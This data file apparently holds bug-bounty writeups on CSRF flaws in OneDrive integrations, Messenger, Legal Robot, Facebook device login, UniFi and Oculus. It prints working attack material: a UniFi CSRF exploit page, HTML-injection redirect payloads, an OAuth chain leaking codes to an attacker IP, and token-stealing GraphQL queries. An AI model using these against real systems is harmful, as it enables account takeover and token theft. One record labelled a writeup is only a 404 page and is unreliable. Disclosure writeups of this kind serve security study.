Java24: Go deeper on parsing Java class files and broader with Stream gatherers Version 24 version introduces several new language features which collectively simplify code, and provide powerful tools for bytecode manipulation and advanced stream processing. Read article > Blog post Sonar's Take: Software Development Under America's AI Action Plan The White House's \"America's AI Action Plan\" aims to accelerate innovation, but for software development, speed must not compromise security. Nathan Jones, VP of Public Sector at Sonar, explores the recently published plan, risks of AI-generated code, and explains how static analysis tools help ensure AI adoption is both fast and secure. Read article > Blog post AI CodeFix is now generally available AI CodeFix seamlessly integrates AI-driven code fix suggestions into your development workflow with no additional cost for eligible SonarQube subscriptions. Read article > Blog post SonarQube Server 2025 Release 4.1: Faster analysis, stronger security, better coverage Our new 2025.4.1 release empowers developers with significant advancements to enhance code quality, security, and efficiency across multiple languages for your projects and while using open-source code. Read article > Blog post Cyber Resilience Act: Navigating speed and security with AI-coding Modern software development is caught between two powerful forces. On one hand, generative artificial intelligence (AI) coding tools are supercharging development velocity at the expense of rigorous security review. Read article > Blog post Java 23: Embrace the new era of code comments We’ve covered Java 22, and are now getting into Java 23, which introduces several new language features. We’ll focus on enhancing documentation, and how to leverage the new features with simple examples. Read article > Blog post What's the top bug in your language? Find out in The State of Code: Languages report The State of Code report analyzes 7.9B lines of code, revealing top security risks like log injection and XSS and how to fix them. Read article > Blog post How Sonar Helps Achieve a Strong SOC 2 Type II Report An SOC 2 Type II report is a critical attestation for service organizations, demonstrating their commitment to securely managing customer data over time. Learn how SonarQube can streamline your SOC 2 compliance journey! Read article > Blog post Protecting your AI code: How SonarQube defends against the \"Rules File Backdoor\" This case highlights an issue where configuration files were manipulated through hidden Unicode characters, which is a vector now commonly referred to as the \"Rules File Backdoor\". Read article > Prev 1 2 3 ● 40 Next Go to SonarSource homepage Sonar Solutions SAST AI solutions DevOps transformation Outsourcing software development Reduce & manage technical debt Secure by design Code coverage Code review For developers For enterprise Infrastructure as code Public sector Products SonarQube for IDE SonarQube Server SonarQube Cloud Pricing Start for free Explore pricing Company About Careers Commitment to open source Customers Partners Contact us Accessibility Brand identity Media Coverage Press releases Resources Product demos Events hub Customer stories White papers Learn Community Support Legal documentation Knowledge Explore Sonar's rules Blog Languages SonarQube Server documentation SonarQube Cloud documentation SonarQube for IDE documentation Follow SonarSource on Twitter Follow SonarSource on Linkedin AICPA SOC 2 MSECB Website Terms of Use Privacy Notice Cookie Policy Trust center Your Privacy Choices UK Modern Slavery Act Statement © 2008-2025 SonarSource SA. All rights reserved."}
{"source_url": "https://medium.com/@arbazhussain/stealing-access-token-of-one-drive-integration-by-chaining-csrf-vulnerability-779f999624a7", "title": "Stealing Access Token of One-drive Integration By Chaining CSRF Vulnerability | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/stealing-access-token-of-one-drive-integration-by-chaining-csrf-vulnerability-779f999624a7. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStealing Access Token of One-drive Integration By Chaining CSRF Vulnerability | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stealing Access Token of One-drive Integration By Chaining CSRF Vulnerability Arbaz Hussain 2 min read · Jul 18, 2017 -- 1 Listen Share Severity: High Complexity: Easy Weakness: partial 0Auth redirect_uri path Step’s to Reproduce: Site have Third Party integration tab at site.com/integrations. They have one-drive integration . When we Click Activate on Onedrive integration. We Get Redirected to : https://login.live.com/oauth20_authorize.srf?client_id=00000000440E0CCX&response_type=code&redirect_uri=https://www.site.com/account/skydriveOAuthCallback&scope=wl.basic wl.skydrive wl.skydrive_update wl.offline_access From Above URL: redirect_uri=https://www.site.com/account/skydriveOAuthCallback 4. So i started playing with redirect_uri= I Found that redirect_uri is Accepting Anything After redirect_uri=https://www.site.com/account/xxxxxxxxxx 5. This Confirm’s that they haven’t used Strict Path in redirect_uri Allowing anything after redirect_uri=https://www.site.com/account/* https://login.live.com/oauth20_authorize.srf?client_id=00000000440E0CCX&response_type=code&redirect_uri=https://www.site.com/xxxxxxxxxxx&scope=wl.basic wl.skydrive wl.skydrive_update wl.offline_access 6. So Now Possible way’s to Exploit this to get Access token is by Finding Any Open Redirect Vulnerability. So I Keep Looking for Any OpenRedirect Endpoints in site.com to Exploit but no luck. 7. Next day Started reading their API Documentation . And I Came Across : GET /api/testCallback?callback_url=http://yoursite.com which they used for Checking API Callback Request’s on your server. 8. So Finally We Got CSRF Vulnerability Which Make’s GET Request to Attacker’s Server. &redirect_uri=https://www.site.com /api/testCallback?callback_url=http://52.66.158.189/? Finally: https://login.live.com/oauth20_authorize.srf?client_id=00000000440E0CCX&response_type=code&redirect_uri=https://www.site.com /api/testCallback?callback_url=http://52.66.158.189/?&scope=wl.basic+wl.skydrive+wl.skydrive_update+wl.offline_access ~ Success ~ Press enter or click to view image in full size exact path matches should be made instead of partial matches on redirect_uri . API Bugsbounty Hacking Csrf Hackerone -- -- 1 Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://whitton.io/articles/messenger-site-wide-csrf/", "title": "Messenger.com Site-Wide CSRF – Jack", "friendly_explanation": "This is a bug bounty writeup from https://whitton.io/articles/messenger-site-wide-csrf/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMessenger.com Site-Wide CSRF – Jack Open Menu Home About Jack I participate in bug bounty programmes Learn More Email Twitter GitHub Posts All Posts All Tags Image source: _robson_ Messenger.com Site-Wide CSRF July 26, 2015 Reading time ~1 minute I originally wasn’t going to publish this, but @phwd wanted to hear about some of my recent bugs so this post is dedicated to him. This issue was also found by @mazen160 , who blogged about it back in June. When Messenger.com launched back in April, I quickly had a look for any low-hanging fruit. One of the first things to do is check end-points for Cross-Site Request Forgery issues. This is whereby an attacker can abuse the fact that cookies are implicity sent with a request (regardless of where the request is made from), and perform actions on another users behalf, such as sending a message or updating a status. There are different ways of mitigating this (with varying results), but usually this is achieved by sending a non-guessable token with each request, and comparing it to a value stored server-side/decrypting it and verifying the contents. The way I normally check for these is as follows: Perform the request without modifying the parameters, so we can see what the expected result is Remove the CSRF token completely (in this case, the fb_dtsg parameter) Modify one of the characters in the token (but keep the length the same) Remove the value of the token (but leave the parameter in place) Convert to a GET request If any of the above steps produce the same result as #1 then we know that the end-point is likely to be vulnerable (there are some instances where you might get a successful response, but in fact no data has been modified and therefore the token hasn’t been checked). Normally, on Faceboook, the response is one of two, depending on if the request is an AJAX request or not (indicated by the __a parameter). Either a redirect to /common/invalid_request.php : Or an error message: I submitted the following request to change the sound_enabled setting, without fb_dtsg : POST /settings/edit/ HTTP/1.1 Host: www.messenger.com Content-Type: application/x-www-form-urlencoded settings[sound_enabled]=false&__a=1 Which surprisingly gave me the following response: HTTP/1.1 200 OK Content-Type: application/x-javascript; charset=utf-8 Content-Length: 3559 for (;;);{\"__ar\":1,\"payload\":[],\"jsmods\":{\"instances\":[[\"m_a_0\",[\"MarketingLogger\"],[null,{\"is_mobile\":false,\"controller_name\":\"XMessengerDotComSettingsEditController\" ... I tried another end-point, this time to remove a user from a group thread. POST /chat/remove_participants/?uid=100...&tid=153... HTTP/1.1 Host: www.messenger.com Content-Type: application/x-www-form-urlencoded __a=1 Which also worked: HTTP/1.1 200 OK Content-Type: application/x-javascript; charset=utf-8 Content-Length: 136 for (;;);{\"__ar\":1,\"payload\":null,\"domops\":[[\"replace\",\"^.fbProfileBrowserListItem\",true,null]],\"bootloadable\":{},\"ixData\":{},\"lid\":\"0\"} After trying one more I realised that the check was missing on every request. Fix Simple and quick fix - tokens are now properly checked on every request. websec bugbounty csrf facebook messenger Updated on July 26, 2015 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a \"new chapter\" in my ...… Continue reading Obtaining Login Tokens for an Outlook, Office or Azure Account Published on April 03, 2016 Uber Bug Bounty: Turning Self-XSS into Good-XSS Published on March 22, 2016 © 2020 Jack. Powered by Jekyll using the HPSTR Theme ."}
{"source_url": "https://medium.com/@armaanpathan/chain-the-vulnerabilities-and-take-your-report-impact-on-the-moon-csrf-to-html-injection-which-608fa6e74236", "title": "Chain the vulnerabilities and take your report impact on the moon (CSRF to HTML INJECTION which results in USER CREDENTIALS Stealing) | by Armaan Pathan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@armaanpathan/chain-the-vulnerabilities-and-take-your-report-impact-on-the-moon-csrf-to-html-injection-which-608fa6e74236. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nChain the vulnerabilities and take your report impact on the moon (CSRF to HTML INJECTION which results in USER CREDENTIALS Stealing) | by Armaan Pathan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Chain the vulnerabilities and take your report impact on the moon (CSRF to HTML INJECTION which results in USER CREDENTIALS Stealing) Armaan Pathan 4 min read · Aug 12, 2017 -- 4 Listen Share It was weekend and time for some Research. So i started reading some public disclosures from https://hackerone.com/hacktivity . after reading some good blogs i have decided to implement them. so i quickly i had selected my target. So i had noticed that legalrobot ( Legal Robot )has a quick response and it is resolving the vulnerabilities quicky. so i have selected Legal Robot as my target and started looking into the assets and its scope. after understanding the scope i had started looking into the application.and i had noticed that is not sanitizing the spacial characters from some parameters. so i started injecting some html tags and was able to inject html tags. Press enter or click to view image in full size So yeah i had found HTML injection. BUG #1. So i started finding xss over there that if i am able to execute xss or not. so it had injected the payload but i had found that web application is using CSP. and alert was not popping up. :(((((((( sad part. :( Press enter or click to view image in full size but if you are a hacker then you will never get satisfied until and unless you will exploit it so i had started digging more and i put my second use case payload. which was “/><META HTTP-EQUIV=”refresh” CONTENT=”1;url=https://app.legalrobot.com/sign-out\"> So yes i with the help of this payload whenever the user visits the roadmap page it will automatically get log out from his-her account. and i had found this tricky. so next i had tried to redirect on my website. and executive malicious script. so i used this payload “/><META HTTP-EQUIV=”refresh” CONTENT=”1;url=http://www.mysite.com/malicious_script.html\"> and what it was resulting to open redirectBUG #2 and also executing my malicious scripts. Press enter or click to view image in full size some how i was able to perform malicious tasks. Quickly i made a PoC of it and reported. and i got quick reply from team, which was this. Press enter or click to view image in full size though the bug was triaged but the team member has mentioned that attacker has to do a little social engineering. i was like yeah but was not satisfied when i read “SOCIAL ENGINEERING” but the team member had gave me a hint by mentioning “UNKNOWN EXPLOIT”. well i that was enough hint for me. again i started digging into the application. and while i was digging into the web application had noticed that the web application is using the websockets. okay now i started checking headers of every pages and i found a Origin header. which was misconfigured. #BUG 3 so i started connecting to third party web sockets to this application and i was able to connect to the application by using the third party web sockets. Press enter or click to view image in full size it was allows web socket connecting from different Origin & it should not work from different origin. i think mobile app hasn’t origin. (I am still not sure about this) so some how i was able to do CSRF attack BUG #4 by using this & i had chained HTML INJECTION WHICH WAS RESULTING TO OPEN REDIRECT to CSRF ATTACK. again i quickly made a poc of this and reported it. This was a quick reply & bug has patched in a single day. (SO QUICK) Press enter or click to view image in full size got a good feedback with a sweet bounty amout. Thanks HackerOne Legal Robot . Thanks for reading guys. Comments most welcome. have a great day ahead. Security Hackerone -- -- 4 Written by Armaan Pathan 1.6K followers · 4 following Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/blog.darabi.me/2016/05/how-i-bypassed-facebook-csrf-in-2016.html", "title": "Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/blog.darabi.me/2016/05/how-i-bypassed-facebook-csrf-in-2016.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMedium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in PAGE NOT FOUND 404 Out of nothing, something. You can find (just about) anything on Medium — apparently even a page that doesn’t exist. Maybe these stories will take you somewhere new? Home How the #ILookLikeAnEngineer Ad Campaign Happened Ten Years Ago Michelle Glauser Aug 3, 2025 · 9 min read How the #ILookLikeAnEngineer Ad Campaign Happened Ten Years Ago Michelle Glauser Aug 3, 2025 · 9 min read Three Things I Learned Debating RFK Jr.’s Health Policies Dr. Jess Steier Aug 13, 2025 · 8 min read Three Things I Learned Debating RFK Jr.’s Health Policies Dr. Jess Steier Aug 13, 2025 · 8 min read Endurance Sonny Hallett Aug 12, 2025 · 9 min read Endurance Sonny Hallett Aug 12, 2025 · 9 min read It’s the (Theoretical) End of Web Publishing (and I Feel Fine) Will Leitch Aug 12, 2025 · 8 min read Member-only It’s the (Theoretical) End of Web Publishing (and I Feel Fine) Will Leitch Aug 12, 2025 · 8 min read Member-only"}
{"source_url": "https://soroush.secproject.com/blog/2019/04/yet-other-examples-of-abusing-csrf-in-logout/", "title": "Yet Other Examples of Abusing CSRF in Logout | Soroush Dalili (@irsdl) Blog", "friendly_explanation": "This is a bug bounty writeup from https://soroush.secproject.com/blog/2019/04/yet-other-examples-of-abusing-csrf-in-logout/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nYet Other Examples of Abusing CSRF in Logout | Soroush Dalili (@irsdl) Blog Skip to content Soroush Dalili (@irsdl) Blog A web application security ninja 🥷, a semicolon enthusiast! Menu Home Advisories Privacy Policy Bug Bounty Invites! SecProject Yet Other Examples of Abusing CSRF in Logout The “ Login/logout CSRF: Time to reconsider? ” blog post by Mathias Karlsson ( @avlidienbrunn ) is a great resource that shows why sometimes CSRF in logout/login can be considered as an impactful security issue and how it can be abused. In Mathias’ blog post, unauthenticated XSS can also be exploited similar to the self-XSS issue but it is less complicated. This is when a XSS is not accessible to authenticated users. In that case, the attacker logs the user out to deliver the XSS payload which waits for the user to authenticate in another tab in order to perform the ultimate attack. Recently, I found another similar but rare example to perform CSRF attacks in a “secure” website that required logging victims out and waiting for them to log back in later. Although this case is not as common as the examples described by Matthias, it is still a valid case to consider during an assessment. The websites I was testing had an anti-CSRF token in every POST requests that changed per-session, per-request, and per-page. However, as the logout page used a GET request it was vulnerable to CSRF attacks. The web application kept the anti-CSRF token value in the user’s session on the server-side, and GET and POST requests were not interchangeable. All was good until I realised that some of the previously captured POST requests can be replayed with a new authenticated session cookie if I remove the anti-CSRF token’s parameter from the body of the POST request. I could however only send one token-less POST request to each page as I received a security error afterwards. This showed that the website was creating an anti-CSRF token for a page upon accessing the page for the first time (there was also a page that could generate an anti-CSRF token for a given page using AJAX but that is not important here). As a result, I could not exploit this issue if the victim had already browsed a page that I wanted to target. However, as the logout page was vulnerable to CSRF attacks, I could exploit this issue by tricking the victim to visit a malicious website that would: Send a malicious POST request to the website without an anti-CSRF token’s parameter just in case I was very lucky and the victim had not browsed that particular page (very unlikely as it had a few pages) Log the victim out of the target website Keep sending the malicious POST request without the anti-CSRF token’s parameter to perform an action in the background until the user logs back in the target website in another browser tab This entry was posted in Security Posts and tagged CSRF , XSRF , XSS on April 23, 2019 by Soroush Dalili . Post navigation ← How to win BIG and even more! Exploiting Deserialisation in ASP.NET via ViewState → Twitter GitHub LinkedIn Search Search MongoDB NoSQL Injection with Aggregation Pipelines June 23, 2024 Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc in ASP.NET Framework (CVE-2023-36899 & CVE-2023-36560) August 8, 2023 Anchor Tag XSS Exploitation in Firefox with Target=”_blank” August 1, 2023 Thirteen Years On: Advancing the Understanding of IIS Short File Name (SFN) Disclosure! July 31, 2023 My MDSec Blog Posts so far in 2020/2021! October 31, 2020 File Upload Attack using XAMLX Files September 21, 2019 Uploading web.config for Fun and Profit 2 August 15, 2019 IIS Application vs. Folder Detection During Blackbox Testing July 9, 2019 Danger of Stealing Auto Generated .NET Machine Keys May 10, 2019 x-up-devcap-post-charset Header in ASP.NET to Bypass WAFs Again! May 4, 2019 Exploiting Deserialisation in ASP.NET via ViewState April 23, 2019 Yet Other Examples of Abusing CSRF in Logout April 23, 2019 How to win BIG and even more! April 17, 2019 Finding and Exploiting .NET Remoting over HTTP using Deserialisation March 26, 2019 More research on .NET deserialization December 19, 2018 Feel honoured to be there again after 8 years: Top 10 Web Hacking Techniques of 2017 December 19, 2018 Story of my two (but actually three) RCEs in SharePoint in 2018 December 19, 2018 ASP.NET resource files (.RESX) and deserialization issues August 12, 2018 MS 2018 Q4 – Top 5 Bounty Hunter for 2 RCEs in SharePoint Online August 12, 2018 WAF Bypass Techniques – Using HTTP Standard and Web Servers’ Behaviour August 12, 2018 Archives Select Year 2024 (1) 2023 (3) 2020 (1) 2019 (9) 2018 (9) 2017 (4) 2016 (1) 2015 (4) 2014 (6) 2013 (6) 2012 (10) 2011 (3) 2010 (13) 2009 (5) Blog Tags .Net Framework Anti-XSS bypass AntiXSS bypass ASP.NET bug bounty bugbounty bypass Challenge deserialisation deserialization ecommerce ExternalInterface ExternalInterface.call file upload file upload bypass file uploader bypass methods file uploader security bypass financial flash flash xss guideline iis IIS File Extension Security Bypass iis short file name IIS Tilde bug IIS tilde feature IIS tilde vulnerability jar protocol machine.config machinekey penetration testing RCE request encoding sharepoint Short name scanner SQL Injection Unrestricted File Download Unrestricted File Upload viewstate waf WAF bypass web.config XSS XSS Vulnerability ysoserial.net REDDIT Web Security Research HTTP/1.1 must die: the desync endgame August 6, 2025 /u/albinowax The Quiet Side Channel... Smuggling with CL.0 for C2 July 28, 2025 /u/t0xodile Broken Authorization in APIs: Introducing Autoswagger July 24, 2025 /u/tgifffff WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls July 18, 2025 /u/mc_security HTTP desync using via MITM using opportunistic TLS July 8, 2025 /u/albinowax Nonce CSP bypass using Disk Cache July 3, 2025 /u/albinowax DOMDOM Times #19: Can We Really Mitigate Client-Side Prototype Pollution by Using iframes? June 25, 2025 /u/canalun Novel SSRF Technique Involving HTTP Redirect Loops June 23, 2025 /u/albinowax Unexpected security footguns in Go's parsers June 21, 2025 /u/albinowax Funky chunks: abusing ambiguous chunk line terminators for request smuggling June 19, 2025 /u/General_Republic_360 Reddit netsec Channel Feed Vulnerability Management Program - How to implement SLA and its processes August 9, 2025 Theori AIxCC writeup , 0day in sqlite + more August 8, 2025 Blog: Exploiting Retbleed in the real world August 7, 2025 Consent & Compromise: Abusing Entra OAuth for Fun and Access to Internal Microsoft Applications August 7, 2025 Prompt injection engineering for attackers: Exploiting GitHub Copilot August 7, 2025 Exploit-DB Feed [remote] Microsoft Edge (Chromium-based) 135.0.7049.114/.115 - Information Disclosure [webapps] Gandia Integra Total 4.4.2236.1 - SQL Injection [webapps] Copyparty 1.18.6 - Reflected Cross-Site Scripting (XSS) [webapps] LPAR2RRD 8.04 - Remote Code Execution (RCE) [remote] Swagger UI 1.0.3 - Cross-Site Scripting (XSS) Privacy Policy Proudly powered by WordPress"}
{"source_url": "https://www.josipfranjkovic.com/blog/hacking-facebook-csrf-device-login-flow", "title": "Stealing Facebook access_tokens using CSRF in device login flow -  Josip Franjković", "friendly_explanation": "This is a bug bounty writeup from https://www.josipfranjkovic.com/blog/hacking-facebook-csrf-device-login-flow. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStealing Facebook access_tokens using CSRF in device login flow - Josip Franjković Josip Franjković web security consultant Blog Bug bounties Stealing Facebook access_tokens using CSRF in device login flow written on July 19th, 2016 Facebook has published a way to use OAuth on Internet of Things devices, called Facebook Login for Devices. You can read the documentation here . The usual flow is: Application requests graph.facebook.com/oauth/device?type=device_code&client_id=1 to retreive a hash code and user_code The application tells the user to go to facebook.com/device and input the user_code The user inputs the code and verifies the application through usual OAuth flow. user_code is then connected to application code. https://www.facebook.com/v2.5/dialog/oauth?redirect_uri=https%3A%2F%2Fm.facebook.com%2Fdevice.php%3FuserCode%3D{ $user_code }&client_id=1234 This is the mobile version of device login flow - redirect_uri points to a mobile domain. The application can now request graph.facebook.com/oauth/device?type=device_token&client_id=1&code=hash_code to gain the user access_token The problem lies in step number 3: when user_code is connected to application_code, it is done like so: https://m.facebook.com/device.php?userCode= $userCode &code= $appCode As you can see, there is no CSRF protection, so I started building my proof of concept around that: The attacker requests graph.facebook.com/oauth/device?type=device_code&client_id=1 to get the user_code ( abcd ) and hash code ( 4567 ) Present a page to victim which will load https://www.facebook.com/v2.5/dialog/oauth?redirect_uri=https%3A%2F%2Fm.facebook.com%2Fdevice.php%3FuserCode%3D abcd &client_id=1234 The /dialog/oauth will redirect to https://m.facebook.com/device.php?userCode= abcd &code=aZx... which will succeed The attacker now requests graph.facebook.com/oauth/device?type=device_token&client_id=1&code= 4567 to get the access_token of the victim. To exploit this, attacker would need to know the victim has approved an application which has “Login for Devices” enabled, which makes it fairly hard to abuse - this is a perfect storm vulnerability. Through further testing, I found out that every app which has “Login from Devices” enabled, and “Web OAuth Login” disabled gets “m.facebook.com/device.php” automagically added as a valid redirect_uri. Theoretically, if a pre-approved official Facebook application is made for the future iToaster, this bug could have lead to info disclosure on any Facebook account, and perhaps more, depending on the app permissions. It was a long shot, and I found no such application (thanks @phwd for help here). Facebook has fixed this first by adding a re-confirmation prompt every time you try to use device login, and later by implementing CSRF protection through \"state\" OAuth parameter: The timeline: December 8, 2015: Bug reported December 9, 2015: Additional information sent, along with a proof of concept page December 11, 2015: Facebook confirms the vulnerability February 1, 2016: I ask for updates about the report February 10, 2016: Facebook informs me they have fixed the issue February 10, 2016: Nope, message was sent in error February 18, 2016: Bug is now fixed Random blog post Bug bounties Race conditions on the web written on July 12th, 2016 Read more Josip Franjković web security consultant I enjoy breaking websites and participating in various bug bounty programs. You can contact me using: @JosipFranjkovic (DM open to everyone) [email protected] keybase.io/josipfranjkovic All rights reserved © 2018. — Josip Franjković"}
{"source_url": "https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass/", "title": "Ubiquiti Bug Bounty: UniFi v3.2.10 Generic CSRF Protection Bypass | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUbiquiti Bug Bounty: UniFi v3.2.10 Generic CSRF Protection Bypass | RCE Security Home About Contact Us Services Research Select Page Ubiquiti Bug Bounty: UniFi v3.2.10 Generic CSRF Protection Bypass by Julien Ahrens | Tuesday, February 23, 2016 | Bug Bounty | 0 comments Better late than never. This article will give you some insights about my discovered generic Cross-Site Request Forgery Protection Bypass in Ubiquiti’s UniFi v3.2.10 and below, as published some time earlier this year on HackerOne . This vulnerability basically allows an attacker to compromise the UniFi installation including connected devices by e.g. changing passwords of users, adding new users, changing device usernames and passwords or by creating new WLAN configurations. At the end of this article you can also read about the reason for the disclosure delay and about my experience with the Ubiquiti Bug Bounty program – but first let’s start with the more interesting stuff 😉 Technical Details about the Vulnerability It’s basically about a faulty Cross-Site Request Forgery protection. Ubiquiti’s CSRF protection basically verifies whether the Referer header exists and whether the header value matches the host where the UniFi application is running on. So if an attacker tries to exploit a functionality within UniFi with a Referer header, which is not the same like the host of the UniFi installation, the application denies the action: HTTP/1.1 401 Unauthorized Server: Apache-Coyote/1.1 Content-Type: application/json;charset=ISO-8859-1 Content-Length: 78 Date: Thu, 19 Mar 2015 17:24:53 GMT { \"data\" : [ ] , \"meta\" : { \"msg\" : \"api.err.LoginRequired\" , \"rc\" : \"error\"}} But if the Referer header is stripped, the application happily accepts any action. Thus all an attacker has to do is to strip out the Referer header. This could be achieved using the following script: <html> <head> <script> function load() { var postdata = '<form id=csrf method=POST enctype=\\'text\\/plain\\' action=\\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\\'>' + '<input type=hidden name=\\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\\' value=\\'\\' />' + '</form>'; top.frames[0].document.body.innerHTML=postdata; top.frames[0].document.getElementById('csrf').submit(); } </script> </head> <body onload=\"load()\"> <iframe src=\"about:blank\" id=\"noreferer\">< /iframe> </body> </html> This script is about multiple tricks to achieve the JSON-based CSRF: 1. enctype=’text/plain’ Without using the enctype set to text/plain, the payload is sent using the “application/x-www-form-urlencoded” Content-Type, which results in a malformed request like: json%3D%257B%2522name%2522%253A%2522admin%2522%252C%2522x_password%2522%253A%2522csrfpwd%2522%252C%2522email%2522%253A%2522info%2540rcesecurity.com%2522%252C%2522lang%2522%253A%2522en_US%2522%252C%2522cmd%2522%253A%2522set-self%2522%257D= Setting the Content-Type to text/plain using enctype solves this problem: json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D= 2. Using the payload in the <input name> attribute If you use the payload in the value attribute, then you have to use the name attribute too (otherwise the payload isn’t sent at all), which results in a malformed request like the following: payload=json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D Using the payload in the name tag, solves this problem, since the value tag is optional: json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D= 3. iframe src=”about:blank” To strip out the Referer header, a nice and simple trick as outlined by webstersprodigy can be utilized: By setting the iframe source to “about:blank” the Referer header can be stripped, because “about:blank” obviously doesn’t have a domain. 4. top.frames[0].document.body.innerHTML=postdata; In combination with the iframe source trick, Javascript’s top.frames can be used to fill the iframe with contents to submit. Et voila. Working exploit 🙂 json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D= (The trailing “=” can be ignored, as the application does 🙂 ) Why this delay of the official disclosure? The reason for the delay of this blog article and the posting on Full-Disclosure, is a simple one: While doing the coordination process on HackerOne, I requested a CVE from MITRE, but due to some internal changes on their side, it took them more than one month and several pings to issue a statement about that. Unfortunately, I then received the answer that MITRE will not assign CVEs to vulnerabilities in uncommon applications like the Ubiquiti one: The MITRE CVE team has started enforcing the scope and coverage requirements previously agreed upon with the CVE Editorial Board, and outlined in http://cve.mitre.org/cve/data_sources_product_coverage.html . MITRE and the CVE Editorial Board agreed upon this scope several years ago, but only recently put it into effect by declining to assign CVE IDs to products that are out of scope. We are currently working with the CVE Editorial Board to define a more up to date list of products, as well as a process that would allow products to be added or subtracted as appropriate, but do not know when this will be completed. This is quite interesting, because for the past 5 years MITRE assigned CVEs for all my vulnerabilities without problems, but stopped to do so in general now. In my opinion this leads the CVE system ad aburdum, because vulnerabilities (regardless of their severity) in uncommon software won’t be tracked anymore. So…Maybe OSVDB-IDs should replace CVEs 😉 Well, at least at the point of finalizing this article, MITRE has added Ubiquiti to the list of proposed products. Final thoughts about the bug bounty program Maybe you have heard of the really nice RCE vulnerability , which was awarded with $18k by Ubiquiti. However as this is by itself a very fitting reward, I still like to outline that my generic (!) CSRF protection bypass was only rewarded with $500, although it’s possible to compromise UniFi and all connected devices – changing device passwords seems not to be so bad – right? I think this is a heavily unbalanced rewarding scheme as applied by Ubiquiti. Plus their communication behavior during the coordination process is more than poor. Nothing more to say. X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf", "title": "Hacking Facebook accounts using CSRF in Oculus-Facebook integration -  Josip Franjković", "friendly_explanation": "This is a bug bounty writeup from https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjković Josip Franjković web security consultant Blog Bug bounties Hacking Facebook accounts using CSRF in Oculus-Facebook integration written on January 15th, 2018 Oculus enables users to connect their Facebook accounts for a more \"social\" experience. This can be done using both the native Windows Oculus application and using browsers. I took a deeper look at the native Windows flow, and found a CSRF vulnerability which allowed me to connect a victim's Facebook account to attacker's Oculus account. Once connected, the attacker could extract the victim's access token, and use Facebook's GraphQL queries to take over the account. Steps to take over the victim's Facebook account: Using the attacker's Oculus account, create the following GraphQL mutation. The mutation should be sent to graph.oculus.com/graphql , with the attacker's Oculus access_token : Mutation Test { facebook_sso_uri_generate( <input> ) { uri } } &query_params={\"input\":{\"client_mutation_id\":\"1\"}} The response will contain a link similar to this: https://www.oculus.com/facebook_login_sso/?username=josip.tester1&ext=1508804050&hash=AeQ6a90lgYfffT5k The idea behind the link is to enable a single click integration between the two services. If the victim clicks on the link or visits a page which renders it as the src attribute on an <img> tag, their Facebook account will be connected to the attacker's Oculus account. In the background, the link actually redirects to Facebook's OAuth flow, skips it, and then connects the two accounts. At this point I thought about reporting this to Facebook, since the attacker could view victim's partial friend list and other minor information, but decided to dig a bit deeper into the native application. The app's app.asar contained references to a GraphQL query which returned information about the connected Facebook account: viewer(){ linked_accounts_info { facebook_account { facebook_id } } } Getting the Facebook ID is useless - it is public anyway. However... After a bit of guessing, I found out it is also possible to query for the victim's Facebook access_token: viewer(){ linked_accounts_info { facebook_account { access_token } } } A screenshot of the request and the response: This is a first-party access_token , which also has access to Facebook's GraphQL endpoint - third party apps are not allowed to do that. Once you get such a token, you have full control of the account. By previously decompiling various Facebook apps, I had recorded some persisted GraphQL queries. I used these to prove the account takeover and add a new phone number to my test victim's account: doc_id is the persisted query ID, matching the \"SendConfirmationMutation\" mutation which adds a new mobile phone. graph.facebook.com/graphql? doc_id=10153582085883380 